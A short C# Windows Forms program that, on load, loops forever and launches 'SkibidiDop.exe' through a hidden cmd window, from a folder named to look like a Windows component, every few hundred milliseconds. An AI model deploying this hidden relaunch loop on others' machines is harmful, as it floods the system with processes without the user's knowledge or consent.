using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Start
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        void Cmd(string line)
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = $"/c {line}",
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            }) ;
        }

        async void Form1_Load(object sender, EventArgs e)
        {
            int i = 8000;
            while (true)
            {
                if (i == 8000) i = 5;
                else if (i > 1000) i -= 1000;
                else if (i > 300) i -= 100;
                await Task.Delay(i);
                Cmd($"start \"\" \"{Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)}/Windows Doppler Drives/SkibidiDop.exe\"");
                if (i == 5) i = 7000;
            }
        }
    }
}
